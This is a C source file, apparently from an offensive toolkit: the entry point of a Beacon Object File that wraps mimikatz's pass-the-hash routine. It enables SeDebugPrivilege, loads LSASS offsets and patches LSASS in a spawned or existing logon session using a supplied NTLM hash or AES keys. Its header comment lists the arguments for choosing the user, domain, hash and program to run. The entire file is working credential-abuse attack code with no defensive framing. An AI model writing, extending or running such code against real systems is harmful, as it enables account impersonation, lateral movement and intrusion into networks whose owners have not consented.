/*
 * pth_bof.c — sekurlsa::pth (Pass-the-Hash) BOF entry point.
 *
 * go() flow:
 *   bof_get_nt_version   -> fingerprint current Windows build
 *   enable SeDebugPrivilege
 *   kuhl_m_sekurlsa_init -> load LSASS structure offsets
 *   kuhl_m_sekurlsa_pth(argc, argv) -> spawn sacrificial process + patch LSASS
 *   kuhl_m_sekurlsa_clean
 *
 * Args (passed via Beacon's utf-8 blob, parsed into wchar_t argv):
 *   /user:<sam>      required
 *   /domain:<fqdn>   required (NetBIOS short also works)
 *   /ntlm:<hash>     NTLM hash (32 hex chars) — or /rc4:<hash>
 *   /aes128:<key>    optional AES128 key (Win8.1+)
 *   /aes256:<key>    optional AES256 key (Win8.1+)
 *   /run:<cmdline>   optional program to spawn (default cmd.exe)
 *   /impersonate     impersonate current process instead of spawning
 *   /luid:<luid>     patch an existing logon session instead
 */
#include "bofdefs.h"
#include "go_common.h"
#include "globals.h"
#include "kull_m_output.h"
#include "sekurlsa/kuhl_m_sekurlsa.h"
#include "sekurlsa/kuhl_m_sekurlsa_utils.h"
#include "kull_m_process.h"

void bof_output_flush(void);

DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
#define OpenProcessToken      ADVAPI32$OpenProcessToken
#define LookupPrivilegeValueA ADVAPI32$LookupPrivilegeValueA
#define AdjustTokenPrivileges ADVAPI32$AdjustTokenPrivileges
#define CloseHandle           KERNEL32$CloseHandle

NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[]);

static void enable_se_debug_privilege(void) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return;
    }
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
}

DECLSPEC_EXPORT void go(char* args, int len) {
    int argc = 0;
    wchar_t** argv = NULL;

    bof_get_nt_version();
    kull_m_output_init();

    enable_se_debug_privilege();

    argv = bof_argv_from_utf8(args, len, &argc);
    if (!argv || argc < 1) {
        kprintf(L"[!] pth: no arguments\n");
        bof_output_flush();
        if (argv) bof_argv_free(argv);
        return;
    }

    kuhl_m_sekurlsa_init();
    kuhl_m_sekurlsa_pth(argc, argv);
    kuhl_m_sekurlsa_clean();

    bof_output_flush();
    bof_argv_free(argv);
}
